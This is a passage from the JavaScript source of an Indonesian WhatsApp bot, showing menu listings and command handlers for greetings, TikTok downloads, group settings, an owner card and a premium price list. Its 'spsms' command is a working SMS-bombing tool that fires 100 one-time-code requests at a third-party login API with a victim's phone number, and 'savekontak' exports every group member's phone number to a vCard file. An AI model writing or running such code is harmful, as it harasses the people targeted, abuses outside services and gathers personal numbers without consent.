     ヤ ◦ ꜱᴏᴜɴᴅ25
     ヤ ◦ ꜱᴏᴜɴᴅ26
     ヤ ◦ ꜱᴏᴜɴᴅ27
     ヤ ◦ ꜱᴏᴜɴᴅ28
     ヤ ◦ ꜱᴏᴜɴᴅ29
     ヤ ◦ ꜱᴏᴜɴᴅ30
     ヤ ◦ ꜱᴏᴜɴᴅ31
     ヤ ◦ ꜱᴏᴜɴᴅ32
     ヤ ◦ ꜱᴏᴜɴᴅ33
     ヤ ◦ ꜱᴏᴜɴᴅ34
     ヤ ◦ ꜱᴏᴜɴᴅ35
     ヤ ◦ ꜱᴏᴜɴᴅ36
     ヤ ◦ ꜱᴏᴜɴᴅ37
     ヤ ◦ ꜱᴏᴜɴᴅ38
     ヤ ◦ ꜱᴏᴜɴᴅ39
     ヤ ◦ ꜱᴏᴜɴᴅ40
     ヤ ◦ ꜱᴏᴜɴᴅ41
     ヤ ◦ ꜱᴏᴜɴᴅ42
     ヤ ◦ ꜱᴏᴜɴᴅ43
     ヤ ◦ ꜱᴏᴜɴᴅ44
     ヤ ◦ ꜱᴏᴜɴᴅ45
     ヤ ◦ ꜱᴏᴜɴᴅ46
     ヤ ◦ ꜱᴏᴜɴᴅ47
     ヤ ◦ ꜱᴏᴜɴᴅ48
     ヤ ◦ ꜱᴏᴜɴᴅ49
     ヤ ◦ ꜱᴏᴜɴᴅ50
     ヤ ◦ ꜱᴏᴜɴᴅ51
     ヤ ◦ ꜱᴏᴜɴᴅ52
     ヤ ◦ ꜱᴏᴜɴᴅ53   
     ヤ ◦ ꜱᴏᴜɴᴅ54
     ヤ ◦ ꜱᴏᴜɴᴅ55
     ヤ ◦ ꜱᴏᴜɴᴅ56
     ヤ ◦ ꜱᴏᴜɴᴅ57
     ヤ ◦ ꜱᴏᴜɴᴅ58
     ヤ ◦ ꜱᴏᴜɴᴅ59
     ヤ ◦ ꜱᴏᴜɴᴅ60
     ヤ ◦ ꜱᴏᴜɴᴅ61
     ヤ ◦ ꜱᴏᴜɴᴅ62
     ヤ ◦ ꜱᴏᴜɴᴅ63
     ヤ ◦ ꜱᴏᴜɴᴅ64
     ヤ ◦ ꜱᴏᴜɴᴅ65
     ヤ ◦ ꜱᴏᴜɴᴅ66
     ヤ ◦ ꜱᴏᴜɴᴅ67
     ヤ ◦ ꜱᴏᴜɴᴅ68
     ヤ ◦ ꜱᴏᴜɴᴅ69
     ヤ ◦ ꜱᴏᴜɴᴅ70
     ヤ ◦ ꜱᴏᴜɴᴅ71
     ヤ ◦ ꜱᴏᴜɴᴅ72
     ヤ ◦ ꜱᴏᴜɴᴅ73
     ヤ ◦ ꜱᴏᴜɴᴅ74
     ヤ ◦ ꜱᴏᴜɴᴅ75
     ヤ ◦ ꜱᴏᴜɴᴅ76
     ヤ ◦ ꜱᴏᴜɴᴅ77
     ヤ ◦ ꜱᴏᴜɴᴅ78
     ヤ ◦ ꜱᴏᴜɴᴅ79
     ヤ ◦ ꜱᴏᴜɴᴅ80
     ヤ ◦ ꜱᴏᴜɴᴅ81
     ヤ ◦ ꜱᴏᴜɴᴅ82
     ヤ ◦ ꜱᴏᴜɴᴅ83
     ヤ ◦ ꜱᴏᴜɴᴅ84
     ヤ ◦ ꜱᴏᴜɴᴅ85
     ヤ ◦ ꜱᴏᴜɴᴅ86
     ヤ ◦ ꜱᴏᴜɴᴅ87
     ヤ ◦ ꜱᴏᴜɴᴅ88
     ヤ ◦ ꜱᴏᴜɴᴅ89
     ヤ ◦ ꜱᴏᴜɴᴅ90
     ヤ ◦ ꜱᴏᴜɴᴅ91
     ヤ ◦ ꜱᴏᴜɴᴅ92
     ヤ ◦ ꜱᴏᴜɴᴅ93
     ヤ ◦ ꜱᴏᴜɴᴅ94
     ヤ ◦ ꜱᴏᴜɴᴅ95
     ヤ ◦ ꜱᴏᴜɴᴅ96
     ヤ ◦ ꜱᴏᴜɴᴅ97
     ヤ ◦ ꜱᴏᴜɴᴅ98
     ヤ ◦ ꜱᴏᴜɴᴅ99
     ヤ ◦ ꜱᴏᴜɴᴅ100
     ヤ ◦ ꜱᴏᴜɴᴅ101
     ヤ ◦ ꜱᴏᴜɴᴅ102
     ヤ ◦ ꜱᴏᴜɴᴅ103
     ヤ ◦ ꜱᴏᴜɴᴅ104
     ヤ ◦ ꜱᴏᴜɴᴅ105
     ヤ ◦ ꜱᴏᴜɴᴅ106
     ヤ ◦ ꜱᴏᴜɴᴅ107
     ヤ ◦ ꜱᴏᴜɴᴅ108
     ヤ ◦ ꜱᴏᴜɴᴅ109
     ヤ ◦ ꜱᴏᴜɴᴅ110
     ヤ ◦ ꜱᴏᴜɴᴅ111
     ヤ ◦ ꜱᴏᴜɴᴅ112
     ヤ ◦ ꜱᴏᴜɴᴅ113
     ヤ ◦ ꜱᴏᴜɴᴅ114
     ヤ ◦ ꜱᴏᴜɴᴅ115
     ヤ ◦ ꜱᴏᴜɴᴅ116
     ヤ ◦ ꜱᴏᴜɴᴅ117
     ヤ ◦ ꜱᴏᴜɴᴅ118
     ヤ ◦ ꜱᴏᴜɴᴅ119
     ヤ ◦ ꜱᴏᴜɴᴅ120
     ヤ ◦ ꜱᴏᴜɴᴅ121
     ヤ ◦ ꜱᴏᴜɴᴅ122
     ヤ ◦ ꜱᴏᴜɴᴅ123
     ヤ ◦ ꜱᴏᴜɴᴅ124
     ヤ ◦ ꜱᴏᴜɴᴅ125
     ヤ ◦ ꜱᴏᴜɴᴅ126
     ヤ ◦ ꜱᴏᴜɴᴅ127
     ヤ ◦ ꜱᴏᴜɴᴅ128
     ヤ ◦ ꜱᴏᴜɴᴅ129
     ヤ ◦ ꜱᴏᴜɴᴅ130
     ヤ ◦ ꜱᴏᴜɴᴅ131
     ヤ ◦ ꜱᴏᴜɴᴅ132
     ヤ ◦ ꜱᴏᴜɴᴅ133
     ヤ ◦ ꜱᴏᴜɴᴅ134
     ヤ ◦ ꜱᴏᴜɴᴅ135
     ヤ ◦ ꜱᴏᴜɴᴅ136
     ヤ ◦ ꜱᴏᴜɴᴅ137
     ヤ ◦ ꜱᴏᴜɴᴅ138
     ヤ ◦ ꜱᴏᴜɴᴅ139
     ヤ ◦ ꜱᴏᴜɴᴅ140
     ヤ ◦ ꜱᴏᴜɴᴅ141
     ヤ ◦ ꜱᴏᴜɴᴅ142
     ヤ ◦ ꜱᴏᴜɴᴅ143
     ヤ ◦ ꜱᴏᴜɴᴅ144
     ヤ ◦ ꜱᴏᴜɴᴅ145
     ヤ ◦ ꜱᴏᴜɴᴅ146
     ヤ ◦ ꜱᴏᴜɴᴅ147
     ヤ ◦ ꜱᴏᴜɴᴅ148
     ヤ ◦ ꜱᴏᴜɴᴅ149
     ヤ ◦ ꜱᴏᴜɴᴅ150
     ヤ ◦ ꜱᴏᴜɴᴅ151
     ヤ ◦ ꜱᴏᴜɴᴅ152
     ヤ ◦ ꜱᴏᴜɴᴅ153
     ヤ ◦ ꜱᴏᴜɴᴅ154
     ヤ ◦ ꜱᴏᴜɴᴅ155
     ヤ ◦ ꜱᴏᴜɴᴅ156
     ヤ ◦ ꜱᴏᴜɴᴅ157
     ヤ ◦ ꜱᴏᴜɴᴅ158
     ヤ ◦ ꜱᴏᴜɴᴅ159
     ヤ ◦ ꜱᴏᴜɴᴅ160
     ヤ ◦ ꜱᴏᴜɴᴅ161

⫹┈─────────────────┈⫺
*メ S A D M E N U*
⫹┈─────────────────┈⫺
     ヤ ◦ ꜱᴀᴅ1
     ヤ ◦ ꜱᴀᴅ2
     ヤ ◦ ꜱᴀᴅ3
     ヤ ◦ ꜱᴀᴅ4
     ヤ ◦ ꜱᴀᴅ5
     ヤ ◦ ꜱᴀᴅ6
     ヤ ◦ ꜱᴀᴅ7
     ヤ ◦ ꜱᴀᴅ8
     ヤ ◦ ꜱᴀᴅ9
     ヤ ◦ ꜱᴀᴅ10
     ヤ ◦ ꜱᴀᴅ11
     ヤ ◦ ꜱᴀᴅ12
     ヤ ◦ ꜱᴀᴅ13
     ヤ ◦ ꜱᴀᴅ14
     ヤ ◦ ꜱᴀᴅ15
     ヤ ◦ ꜱᴀᴅ16
     ヤ ◦ ꜱᴀᴅ17
     ヤ ◦ ꜱᴀᴅ18
     ヤ ◦ ꜱᴀᴅ19
     ヤ ◦ ꜱᴀᴅ20
     ヤ ◦ ꜱᴀᴅ21
     ヤ ◦ ꜱᴀᴅ22
     ヤ ◦ ꜱᴀᴅ23
     ヤ ◦ ꜱᴀᴅ24
     ヤ ◦ ꜱᴀᴅ25
     ヤ ◦ ꜱᴀᴅ26
     ヤ ◦ ꜱᴀᴅ27
     ヤ ◦ ꜱᴀᴅ28
     ヤ ◦ ꜱᴀᴅ29
     ヤ ◦ ꜱᴀᴅ30
     ヤ ◦ ꜱᴀᴅ31
     ヤ ◦ ꜱᴀᴅ32
     ヤ ◦ ꜱᴀᴅ33
     ヤ ◦ ꜱᴀᴅ34
     ヤ ◦ ꜱᴀᴅ35

⫹┈─────────────────┈⫺     
*メ C E R P E N M E N U*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴅᴀᴇʀᴀʜ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀɪɴɢɢʀɪꜱ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴊᴀᴡᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀꜱᴜɴᴅᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀɪꜱʟᴀᴍɪ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀᴘᴇʀᴛᴀᴍᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀʀᴏᴍᴀɴᴛɪꜱ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴅɪʜ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇɢɪᴛɪɢᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴊᴀᴛɪ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴋɪꜱᴀʜɴʏᴀᴛᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴀᴛᴀʜʜᴀᴛɪ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴀʟᴀᴍᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ
     ヤ ◦ ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ
     
⫹┈─────────────────┈⫺     
*メ E P H O T O M E N U*
⫹┈─────────────────┈⫺
     ヤ ◦ ɢʟɪᴛᴄʜᴛᴇxᴛ
     ヤ ◦ ᴡʀɪᴛᴇᴛᴇxᴛ
     ヤ ◦ ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ
     ヤ ◦ ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ
     ヤ ◦ ᴘɪxᴇʟɢʟɪᴛᴄʜ
     ヤ ◦ ɴᴇᴏɴɢʟɪᴛᴄʜ
     ヤ ◦ ꜰʟᴀɢᴛᴇxᴛ
     ヤ ◦ ꜰʟᴀɢ3ᴅᴛᴇxᴛ
     ヤ ◦ ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ
     ヤ ◦ ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ
     ヤ ◦ ɢʟᴏᴡɪɴɢᴛᴇxᴛ
     ヤ ◦ ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ
     ヤ ◦ ʟᴏɢᴏᴍᴀᴋᴇʀʟᴋ
     ヤ ◦ ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ
     ヤ ◦ ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ
     ヤ ◦ ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ
     ヤ ◦ ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ
     ヤ ◦ ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ
     ヤ ◦ ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ
     ヤ ◦ ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ
     ヤ ◦ ᴍʟᴜxᴜʀʏɢᴏʟᴅ
     ヤ ◦ ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ
     ヤ ◦ ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ
     ヤ ◦ ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ
     ヤ ◦ 1917ꜱᴛʏʟᴇ
     ヤ ◦ ʟᴍᴀᴋɪɴɢɴᴇᴏɴ
     ヤ ◦ ʀᴏʏᴀʟᴛᴇxᴛ
     ヤ ◦ ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ
     ヤ ◦ ɢᴀʟᴀxʏꜱᴛʏʟᴇ
     ヤ ◦ ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
     ヤ ◦ ʟᴏɢᴏɴᴇᴋᴏ`

slime.sendMessage(m?.chat, {
text: menuu,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `Alya Bot`,
body: 'Welcome To Fitur AlyaBot',
thumbnailUrl: 'https://files.catbox.moe/ijqqem.jpg',
sourceUrl: 'https://lynnzxd.carrd.co/#',
mediaType: 1,
renderLargerThumbnail: true
}
}
}
)
await slime.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/yayaya.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
//=============== F E A T U R E ======================//
case "Assalamu'alaikum": case "assalamualaikum": {
reply('Walaikumussalam warahmatullahi wabarokatuh')
}
break
case 'spsms': {
if (!isCreator) return m.reply('*khusus Premium*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] SPAM (SMS) BY LYNNZXD`);
});
}
} else reply(`Penggunaan spsms nomor/reply pesan target*\nContoh spsms +628xxx`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
case 'savekontak': case 'svkontak':
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply('Khusus Owner')
let cmiggc = await slime.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
slime.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'tiktokslide':
        case 'tiktokimg':
        { 
    if (!isRegistered) return reply('Kamu belum daftar !\nSilahkan daftar dengan cara .daftar')
        	if (!args[0]) return reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`)
slime.sendMessage(m.chat, { react: { text: `🕐`, key: m.key }})
        let api = await fetch(`https://api.betabotz.eu.org/api/download/ttslide?url=${args[0]}&apikey=ECh9UMCi`)
        let betaku = await api.json();
        for (let i of betaku.result.images) {
        slime.sendMessage(m.chat, {
        image: {
        	url: i
        },
        caption: 'SUCCES'
        }, {
        	quoted: m
        })
        }
        }
        break
case 'belipanel': {
m.reply('https://wa.me/6283167532721?text=Bang+mau+beli+panel')
}
break
case 'owner': {
let name = m.pushName || slime.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *ʜᴀʟᴏ ᴋᴀᴋ \`${name}\`, sɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴀɴ ᴛᴏᴍʙᴏʟ ᴄʜᴀᴛ ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴜʙᴜɴɢɪ ᴏᴡɴᴇʀᴋᴜ*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = fs.readFileSync("./SlimeMedia/image/slime.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: slime.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './SlimeMedia/image/slime.jpg' } }, { upload: slime.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[OWNER BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${global.ownername} ]\`* ]==─
┆ • ᴊᴀɴɢᴀɴ sᴘᴀᴍ
┆ • sᴇʟʟ ᴘᴀɴᴇʟ ʀᴜɴ ʙᴏᴛ
┆ • ꜱᴇʟʟ ᴠᴘꜱ ᴘᴀɴᴇʟ
┆ • ꜱᴇʟʟ ᴀᴋᴜɴ ᴅɪɢɪᴛᴀʟ ᴏᴄᴇᴀɴ
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"ᴄʜᴀᴛ ᴏᴡɴᴇʀ ( ${global.ownername} )","url":"https://wa.me/${global.owner}","merchant_url":"https://wa.me/${global.owner}"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './SlimeMedia/image/slime.jpg' } }, { upload: slime.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[NOMOR BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${botname} ]\`* ]==─
┆• ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴏᴛ
┆• ᴅɪʟᴀʀᴀɴɢ ᴍᴇɴᴇʟᴘᴏɴ ʙᴏᴛ 
┆• ʙᴏᴛ ᴛɪᴅᴀᴋ ᴍᴇɴᴇʀɪᴍᴀ sᴠ ᴋᴏɴᴛᴀᴋ
┆• ɴᴏ 18+ 🔞
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"ᴄʜᴀᴛ ʙᴏᴛ ( ${botname} )","url":"https://wa.me/6283167532721?text=.menu","merchant_url":"https://wa.me/6283167532721?text=.menu"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
case 'cekasalmember': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
  if (!m.isGroup) return m.reply(mess.group)
  const participants = await slime.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  participants.forEach(participant => {
const phoneNumber = participant.id.split('@')[0];
if (phoneNumber.startsWith("62")) {
  countIndonesia++;
} else if (phoneNumber.startsWith("60")) {
  countMalaysia++;
} else if (phoneNumber.startsWith("1")) {
  countUSA++;
} else if (phoneNumber.startsWith("+1")) {
  countOther++;
} else {
  countOther++;
}
  });
  const replyMessage = `Jumlah Anggota group Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  m.reply(replyMessage);
}
  break
  case 'prem': case 'buypremium':{
  teks28 = `[ Upgrade User Ke Premium User ]
*_Mengupdate User Menjadi Peremium_*

> PRICE LIST
- 1H - 2K
- 2H - 4K
- 5H - 5K
- 7H - 6K
- 10H - 10K
- 13H - 13K
- 16H - 15K
- 20H - 20K
- SEBULAN - 25K
- PERMANEN - 35K

> BENNEFITS
- UNLOCK OKEP MENU
- UNLOCK BUGMENU
- UNLOCK ADDSALDO
- INFINITY LIMITED
- SALDO INFINITY
- UNLOCK ALL FEATURE PREMIUM
- DLL

anyone like it? please upgrade Premium User to owner / LynnZxD`
  slime.sendMessage(from, { image: { url: "https://telegra.ph/file/7a8291ba6ea77b604e5aa.jpg" }, caption: teks28 }, { quoted: fcall })
}
  break
    case 'group': {   
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!(isCreator || isAdmins)) return reply('Lah Dikira Admin Group Kali')
loading()
if (args[0] === 'close'){
await slime.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await slime.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "Hanako Ai"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Klik tombol *open* untuk membuka group\nKlik tombol *close* untuk menutup group`),
                    subtitle: "© LynnZxD",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Open\",\"id\":\".group open\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Close\",\"id\":\".group close\"}"
},
 ],
 })
 })
 }
 }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
}
break
// versi case


/*
*`SUMBER`*
https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
* Fitur Di Buat Langsung Oleh Sell
*/
case 'ttsearch3': {
if (!text) return reply(`*[ ! ]* *Perintah Di Hentikan*\n*Example ${prefix + command} Resah Jadi Luka*`) 
      if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Silahkan Hubungi Owner Untuk Membeli Limit')
             db.data.users[sender].limit -= 1 // -1 limit
                reply('1 Limit Anda Terpakai')
                     let res = await fetch(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
    let spas = "              "
    let gfris = "`"
    let data = await res.json()
    let json = data.result
	let cap = `${spas}*${gfris}「 T I K T O K S E A R C H 」${gfris}*
*📷Desc:* ${json.title}\n\n${global.footer2}\n
*🎵Music:* ${json.cover}`
